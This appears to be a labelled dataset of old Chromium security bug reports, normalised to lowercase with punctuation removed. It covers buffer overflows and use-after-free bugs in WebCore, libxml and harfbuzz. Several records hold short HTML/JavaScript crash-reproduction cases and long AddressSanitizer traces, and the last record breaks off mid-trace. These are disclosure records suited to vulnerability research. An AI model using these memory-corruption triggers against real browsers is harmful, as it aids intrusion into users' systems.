stack-buffer-overflow in base files anonymous namespace inotifyreadertask run detailed report fuzzer marty_html_twiddler crash type stack-buffer-overflow read 8 crash address crash state crash stack base files anonymous namespace inotifyreadertask run base subtle taskclosureadapter run messageloop runtask unminimized testcase	11
heap-buffer-overflow in xmlstringlendecodeentities vulnerability details a buffer overflow occurs in libxml/src/parser.c:2589 xmlstringlendecodeentities when decoding an entity reference with a long name the code at parser.c:2589 is if nbchars buffer_size i xml_parser_buffer_size growbuffer buffer xml_parser_buffer_size for i 0 i buffer nbchars cur it checks whether additional i elements fit to the buffer increases the buffer when necessary and copies the data the problem is that growbuffer grows the buffer by a fixed amount so with enough data the overflow still occurs there is a similar case on line 3772 but growbuffer is handled correctly version chrome version 18.0.969.0 developer build 113953 linux custom operating system linux 2.6.32 ubuntu 10.04 reproduction case open poc.xhtml in chromium for crashes please include the following additional information type of crash tab crash state i added printf nbchars d buffer_size d\n nbchars buffer_size to the data copying loop nbchars=2040 buffer_size=700 nbchars=2041 buffer_size=700 nbchars=2042 buffer_size=700 nbchars=2043 buffer_size=700 nbchars=2044 buffer_size=700 nbchars=2045 buffer_size=700 nbchars=2046 buffer_size=700 nbchars=2047 buffer_size=700 nbchars=2048 buffer_size=700 program received signal sigsegv segmentation fault in diefrommemorycorruption at third_party/tcmalloc/chromium/src/tcmalloc.cc:1828 1828 p 3 segv gdb x/1i eip diefrommemorycorruption+20 movzbl eax eax gdb info reg eax 3 ecx 1205547020 edx 772686880 ebx 1205547020 esp ebp esi 4290 edi 1204510080 eip diefrommemorycorruption+20 eflags pf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 gdb bt 0 in diefrommemorycorruption at third_party/tcmalloc/chromium/src/tcmalloc.cc:1828 1 in validateallocatedregion ptr cl=26 at third_party/tcmalloc/chromium/src/tcmalloc.cc:1921 2 in do_free_with_callback ptr invalid_free_fn invalidfree at third_party/tcmalloc/chromium/src/tcmalloc.cc:1221 3 in do_free ptr at third_party/tcmalloc/chromium/src/tcmalloc.cc:1249 4 in tc_free 5 in xmlparseattvaluecomplex ctxt attlen normalize=0 at third_party/libxml/src/parser.c:3759 6 in xmlparseattvalueinternal ctxt len alloc normalize=0 at third_party/libxml/src/parser.c:8600 7 in xmlparseattribute2 ctxt pref elem body prefix value len alloc at third_party/libxml/src/parser.c:8656 8 in xmlparsestarttag2 ctxt pref uri tlen at third_party/libxml/src/parser.c:8814 9 in xmlparsetryorfinish ctxt terminate=0 at third_party/libxml/src/parser.c:10867 10 in xmlparsechunk ctxt chunk s size=8578 terminate=0 at third_party/libxml/src/parser.c:11645 more stack frames follow	7
security crash in requestanimationframe when removing a frame vulnerability details please provide a brief explanation of the security issue boris zbarsky from mozilla reported this crash in requestanimationframe handling i do n't currently have access to a debug build to see what sort of crash it is so reporting as a security bug just in case repro case is inline below version chrome version 17.0.962.0 official build 112977 canary operating system mac reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug repro doctype html script window.onload function var el document.getelementsbytagname iframe 0 window.frames 0 webkitrequestanimationframe function el.parentnode.removechild el window.frames 1 webkitrequestanimationframe function alert called script there should be an alert saying called iframe iframe iframe iframe for crashes please include the following additional information type of crash tab crash state do n't have available right this second client id if relevant b780683255d5f911	11
stack-buffer-overflow in hb_myanmarshape detailed report uploader aarya google.com crash type stack-buffer-overflow write 1 crash address crash state crash stack hb_myanmarshape hb_shapeitem webcore complextextcontroller shapeglyphs unminimized testcase	11
heap-use-after-free in webcore renderobject childat vulnerability details use-after-free happens while trying to use freed child object wihin selection version chrome 17.0.961.0 developer build 112955 linux unable to reproduce on stable beta or dev reproduction case html head script function body_start var q document.getelementbyid root contentdocument s q.getelementbyid s g q.getelementbyid g t q.getelementbyid t f q.getelementbyid f var sel window.getselection var rng document.createrange sel.addrange rng rng.selectnodecontents t sel.addrange rng s.insertbefore g f.nextsibling script head body object data i.svg id root onload body_start object body html i.svg comment svg id s xmlns xmlns xlink g id g text id t text text g fefuncr id f fefuncr svg for crashes please include the following additional information 31186 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderobject firstchild const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.h:148 1 in webcore renderobject childat unsigned int const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.cpp:426 2 in webcore rendererafterposition webcore renderobject unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderview.cpp:375 3 in webcore renderview setselection webcore renderobject int webcore renderobject int webcore renderview selectionrepaintmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderview.cpp:467 4 in webcore frameselection updateappearance media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/frameselection.cpp:1730 5 in webcore frameview performpostlayouttasks media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:2260 6 in webcore frameview layout bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:1165 7 in webcore frameview forcelayoutparentviewifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:926 8 in webcore frameview layout bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:1196 9 in webcore frameview updatelayoutandstyleifneededrecursive media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:2970 10 in webcore frameview updatelayoutandstyleifneededrecursive media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frameview.cpp:2979 11 in webkit webviewimpl layout media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1168 12 in renderwidget dodeferredupdate media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:726 13 in renderwidget dodeferredupdateandsendinputack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:688 14 in renderwidget onupdaterectack media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:380 15 in bool ipc message dispatch renderwidget renderwidget ipc message const renderwidget renderwidget void renderwidget media/chromium/chromium/depot_tools/src/./ipc/ipc_message.h:137 16 in renderwidget onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_widget.cc:209 17 in renderviewimpl onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/renderer/render_view_impl.cc:710 18 in messagerouter routemessage ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:46 19 in messagerouter onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/message_router.cc:39 20 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:204 21 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 22 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:877 23 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:501 24 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:512 25 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:702 26 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 27 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:460 28 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:343 29 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 30 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:232 31 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:270 32 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:454 33 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 34 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 35 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 36 in start 0 is located 0 bytes inside of 312-byte region freed by thread t0 here 0 in free usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:37 1 in webcore node detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1413 2 in webcore containernode detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:790 3 in webcore element detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1027 4 in webcore containernode detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:790 5 in webcore element detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:1027 6 in webcore containernode removebetween webcore node webcore node webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:499 7 in webcore containernode removechild webcore node int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:477 8 in webcore containernode insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:157 9 in webcore node insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:659 10 in webcore v8node insertbeforecallback v8 arguments const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/custom/v8nodecustom.cpp:70 addr2line no such file 11 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1177 12 in 13 in 14 in 15 in 16 in 17 in 18 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 19 in v8 internal isolate handle_scope_implementer media/chromium/chromium/depot_tools/src/v8/src/isolate.h:838 20 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:460 21 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:435 22 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:69 23 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 24 in webcore v8abstracteventlistener handleevent webcore scriptexecutioncontext webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:98 25 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:214 26 in webcore eventtarget fireeventlisteners webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:199 27 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2844 28 in webcore eventdispatcher dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:319 previously allocated by thread t0 here 0 in malloc usr/local/google/asan/address-sanitizer/asan/asan_malloc_linux.cc:49 1 in webcore text createrenderer webcore renderarena webcore renderstyle media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/text.cpp:238 2 in webcore noderendererfactory createrenderer media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:293 3 in webcore noderendererfactory createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/noderenderingcontext.cpp:339 4 in webcore node createrendererifneeded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1489 5 in webcore text attach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/text.cpp:250 6 in webcore xmldocumentparser exittext media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/xml/parser/xmldocumentparser.cpp:181 7 in webcore xmldocumentparser endelementns media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/xml/parser/xmldocumentparserlibxml2.cpp:817 8 in xmlparseendtag2 media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:9226 9 in xmlparsetryorfinish media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:11034 10 in xmlparsechunk media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:11625 11 in webcore xmldocumentparser dowrite wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/xml/parser/xmldocumentparserlibxml2.cpp:657 12 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 13 in webcore decodeddatadocumentparser appendbytes webcore documentwriter char const unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/decodeddatadocumentparser.cpp:50 14 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 15 in webkit frameloaderclientimpl committedload webcore documentloader char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1115 16 in void wtf derefifnotnull webcore documentloader webcore documentloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 17 in webcore resourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:291 18 in void wtf derefifnotnull webcore mainresourceloader webcore mainresourceloader media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:52 19 in webcore resourceloader didreceivedata webcore resourcehandle char const int int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:442 20 in resourcedispatcher onreceiveddata ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:393 21 in bool resourcemsg_datareceived dispatch resourcedispatcher resourcedispatcher int base filedescriptor int int ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:151 22 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:539 31186 aborting stats 38m malloced 49m for red zones by 195966 calls stats 3m realloced by 2938 calls stats 24m freed by 58926 calls stats 0m really freed by 0 calls stats 112m 28685 full pages mmaped in 28 calls mmaps by size class 8:196596 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:256 16:64 17:64 18:16 19:8 21:4 22:1 mallocs by size class 8:182619 9:7186 10:3781 11:1103 12:458 13:408 14:174 15:170 16:21 17:34 18:1 19:6 21:4 22:1 frees by size class 8:46783 9:6634 10:3518 11:861 12:381 13:383 14:156 15:164 16:14 17:21 18:1 19:6 21:4 rfrees by size class stats malloc large 46 small slow 561 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
heap use after free with malware blocking page vulnerability details attached reproduction case causes a heap use after free version chrome version 18.0.969.0 developer build 113965 linux dev operating system ubuntu 10.04 64 bit reproduction case 1.open attached test1.html in chrome 2 it tries to load in an iframe 3 chrome will display malware blocking page 4 click on reload button of chrome 5 chrome browser will crash for crashes please include the following additional information type of crash browser crash state this is what asan has to say 7837 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in znkss6_m_repev usr/lib/gcc/x86_64-linux-gnu/4.4 include/c++/4.4/bits/basic_string.h:272 1 in znk11tabcontents8delegateev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/./content/browser/tab_contents/tab_contents.h:93 2 in zn14renderviewhost13onmsgnavigateerkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:910 3 in zn14renderviewhost17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:678 4 in zn21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_process_host_impl.cc:941 5 in zthn8_n21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee 0 6 in zn3ipc12channelproxy7context17ondispatchmessageerkns_7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/ipc/ipc_channel_proxy.cc:263 7 in znk4base8callbackifvvee3runev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/./base/callback.h:274 8 in zn11messageloop21deferorrunpendingtaskerkn4base11pendingtaske home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:512 9 in zn11messageloop6doworkev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:702 10 in zn4base15messagepumpglib17runwithdispatcherepns_11messagepump8delegateepns_21messagepumpdispatchere home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_pump_glib.cc:213 11 in zn11messageloop11runinternalev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:460 12 in autorunstate home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:774 13 in zn22chromebrowsermainparts18mainmessagelooprunepi home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/browser/chrome_browser_main.cc:2000 14 in zn7content15browsermainloop23runmainmessagelooppartsepb home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main_loop.cc:392 15 in z11browsermainrkn7content18mainfunctionparamse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main.cc:102 16 in zn12_global__n_123runnamedprocesstypemainerkssrkn7content18mainfunctionparamsepns2_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:264 17 in zn7content11contentmaineippkcpns_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:455 18 in chromemain home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_main.cc:32 19 in main home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_exe_main_gtk.cc:18 20 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 21 in start 0 is located 456 bytes inside of 608-byte region freed by thread t0 here 0 in zdlpv asan_rtl 1 in zn20navigationcontroller26removeentryatindexinternalei home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:1079 2 in zn20navigationcontroller18removeentryatindexeirk4gurl home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:468 3 in zn24safebrowsingblockingpage11dontproceedev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/browser/safe_browsing/safe_browsing_blocking_page.cc:582 4 in zn16interstitialpage7observeeirkn7content18notificationsourceerkns0_19notificationdetailse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/interstitial_page.cc:282 5 in zn22chromeinterstitialpage7observeeirkn7content18notificationsourceerkns0_19notificationdetailse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/browser/tab_contents/chrome_interstitial_page.cc:52 6 in znk4base7weakptri16observerlistbasein7content20notificationobservereee3getev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/./base/memory/weak_ptr.h:171 7 in zn20navigationcontroller30notifynavigationentrycommittedepn7content20loadcommitteddetailse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:1202 8 in zn20navigationcontroller19rendererdidnavigateerk32viewhostmsg_framenavigate_paramspn7content20loadcommitteddetailse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:637 9 in zn11tabcontents11didnavigateep14renderviewhostrk32viewhostmsg_framenavigate_params home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/tab_contents.cc:1543 10 in zn14renderviewhost13onmsgnavigateerkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:910 11 in zn14renderviewhost17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:678 12 in zn21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_process_host_impl.cc:941 13 in zthn8_n21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee 0 14 in zn3ipc12channelproxy7context17ondispatchmessageerkns_7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/ipc/ipc_channel_proxy.cc:263 15 in znk4base8callbackifvvee3runev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/./base/callback.h:274 16 in zn11messageloop21deferorrunpendingtaskerkn4base11pendingtaske home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:512 17 in zn11messageloop6doworkev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:702 18 in zn4base15messagepumpglib17runwithdispatcherepns_11messagepump8delegateepns_21messagepumpdispatchere home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_pump_glib.cc:213 19 in zn11messageloop11runinternalev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:460 20 in autorunstate home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:774 21 in zn22chromebrowsermainparts18mainmessagelooprunepi home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/browser/chrome_browser_main.cc:2000 22 in zn7content15browsermainloop23runmainmessagelooppartsepb home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main_loop.cc:392 23 in z11browsermainrkn7content18mainfunctionparamse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main.cc:102 24 in zn12_global__n_123runnamedprocesstypemainerkssrkn7content18mainfunctionparamsepns2_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:264 25 in zn7content11contentmaineippkcpns_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:455 26 in chromemain home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_main.cc:32 27 in main home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_exe_main_gtk.cc:18 28 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 previously allocated by thread t0 here 0 in znwm asan_rtl 1 in zn20navigationcontroller28rendererdidnavigatetonewpageerk32viewhostmsg_framenavigate_paramspb home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:790 2 in zn20navigationcontroller19rendererdidnavigateerk32viewhostmsg_framenavigate_paramspn7content20loadcommitteddetailse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/navigation_controller.cc:585 3 in zn11tabcontents11didnavigateep14renderviewhostrk32viewhostmsg_framenavigate_params home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/tab_contents/tab_contents.cc:1543 4 in zn14renderviewhost13onmsgnavigateerkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:910 5 in zn14renderviewhost17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_view_host.cc:678 6 in zn21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/renderer_host/render_process_host_impl.cc:941 7 in zthn8_n21renderprocesshostimpl17onmessagereceivederkn3ipc7messagee 0 8 in zn3ipc12channelproxy7context17ondispatchmessageerkns_7messagee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/ipc/ipc_channel_proxy.cc:263 9 in znk4base8callbackifvvee3runev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/./base/callback.h:274 10 in zn11messageloop21deferorrunpendingtaskerkn4base11pendingtaske home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:512 11 in zn11messageloop6doworkev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:702 12 in zn4base15messagepumpglib17runwithdispatcherepns_11messagepump8delegateepns_21messagepumpdispatchere home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_pump_glib.cc:213 13 in zn11messageloop11runinternalev home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:460 14 in autorunstate home/chamal/chrome/home/chrome-svn/tarball/chromium/src/base/message_loop.cc:774 15 in zn22chromebrowsermainparts18mainmessagelooprunepi home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/browser/chrome_browser_main.cc:2000 16 in zn7content15browsermainloop23runmainmessagelooppartsepb home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main_loop.cc:392 17 in z11browsermainrkn7content18mainfunctionparamse home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/browser/browser_main.cc:102 18 in zn12_global__n_123runnamedprocesstypemainerkssrkn7content18mainfunctionparamsepns2_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:264 19 in zn7content11contentmaineippkcpns_19contentmaindelegatee home/chamal/chrome/home/chrome-svn/tarball/chromium/src/content/app/content_main.cc:455 20 in chromemain home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_main.cc:32 21 in main home/chamal/chrome/home/chrome-svn/tarball/chromium/src/chrome/app/chrome_exe_main_gtk.cc:18 22 in libc_start_main build/buildd/eglibc-2.11.1/csu/libc-start.c:258 7837 aborting shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa	11
heap-buffer-overflow in webcore htmltreebuilder htmltreebuilder vulnerability details heap buffer overflow can be triggered while creating new document fragment version 18.0.1000.0 developer build 116831 linux also crashes on 16.0.912.63 ubuntu 10.10 x64 unable to crash on 16.0.912.75 m windows 7 x64 reproduction case html body id root object id h object script var s document.createelement style var h document.getelementbyid h var r document.createrange h.appendchild s r.selectnodecontents h r.extractcontents s.insertadjacenthtml afterend aaa script body html for crashes please include the following additional information 19807 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in webcore qualifiedname matches webcore qualifiedname const const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/qualifiedname.h:76 1 in webcore element hastagname webcore qualifiedname const const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.h:194 2 in webcore anonymous namespace closestformancestor webcore element media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:235 3 in webcore htmltreebuilder htmltreebuilder webcore htmldocumentparser webcore documentfragment webcore element webcore fragmentscriptingpermission bool unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.cpp:393 4 in webcore htmltreebuilder create webcore htmldocumentparser webcore documentfragment webcore element webcore fragmentscriptingpermission bool unsigned int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmltreebuilder.h:65 5 in webcore htmldocumentparser htmldocumentparser webcore documentfragment webcore element webcore fragmentscriptingpermission media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:93 6 in webcore htmldocumentparser create webcore documentfragment webcore element webcore fragmentscriptingpermission media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.h:65 7 in webcore htmldocumentparser parsedocumentfragment wtf string const webcore documentfragment webcore element webcore fragmentscriptingpermission media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/parser/htmldocumentparser.cpp:556 8 in webcore htmlelement insertadjacenthtml wtf string const wtf string const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlelement.cpp:666 9 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 10 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 11 in 12 in 13 in 14 in 15 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 16 in v8 script run 